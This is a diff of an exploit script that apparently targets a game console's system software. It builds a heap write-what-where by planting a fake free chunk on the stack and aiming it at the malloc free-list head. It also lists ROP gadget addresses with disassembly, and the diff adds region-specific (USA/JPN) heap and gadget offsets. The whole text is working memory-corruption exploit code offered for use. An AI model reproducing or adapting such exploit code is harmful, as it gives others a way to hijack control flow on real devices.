@@ -43,13 +43,13 @@ goal:
 4th ideally is 0 so it finds only the first chunk
 """
 
-malloc = 0x002A9198
-free = 0x002A9190
-nop = 0x002A91A8 # I don't know what this does, but it's in the vtable.
+#malloc = 0x002A9198
+#free = 0x002A9190
+#nop = 0x002A91A8 # I don't know what this does, but it's in the vtable.
 
-memcpy_to_stack = 0x00265D5C
-fake_free = memcpy_to_stack
-fake_vtable = p(malloc) + p(fake_free) + p(nop)
+#memcpy_to_stack = 0x00265D5C
+#fake_free = memcpy_to_stack
+#fake_vtable = p(malloc) + p(fake_free) + p(nop)
 
 """
 fake malloc chunk, located on our stack :)
@@ -61,8 +61,12 @@ fake malloc chunk, located on our stack :)
 0x15D62F18:  0x00000000 ; prev
 0x15D62F1C:  0x00000000 ; next
 """
+
+heapctx = 0x0039B560 # USA
+#heapctx = 0x0039B520 # JPN
+
 fake_free_chunk = 0x15D62F10
-malloc_free_list_head = 0x0039B59C
+malloc_free_list_head = heapctx + 0x3C
 
 what = fake_free_chunk
 where = malloc_free_list_head
@@ -122,7 +126,8 @@ sleep_gadget = 0x001B5A5C
 .text:002E2978                 LDMFD           SP!, {R4-R6,LR}
 .text:002E297C                 B               sub_2E978C
 """
-gpu_flushcache_gadget = 0x002E2958
+gpu_flushcache_gadget = 0x002E2958 # USA. Update required for non-USA.
+#gpu_flushcache_gadget = 0x002E2830 # JPN
 
 """
 .text:002E96FC                 BL              gsp__GetInterruptReceiver
@@ -132,13 +137,15 @@ gpu_flushcache_gadget = 0x002E2958
 .text:002E970C                 ADD             SP, SP, #0x24
 .text:002E9710                 LDMFD           SP!, {R4-R11,PC}
 """
-gpu_enqueue_gadget = 0x002E96FC
+gpu_enqueue_gadget = 0x002E96FC # USA. Update required for non-USA.
+#gpu_enqueue_gadget = 0x002E95D4 # JPN
 
 # LDMFD           SP!, {R4-R10,LR}
 memcpy_gadget = 0x0022DB1C
 
 #002E6F80                 LDMFD           SP!, {R0,PC}
-pop_r0_pc = 0x002e6f80
+pop_r0_pc = 0x002e6f80 # USA. Update required for non-USA.
+#pop_r0_pc = 0x002e6e58 # JPN
 
 #.text:0022B6C8                 LDMFD           SP!, {R1,PC}
 pop_r1_pc = 0x0022B6C8
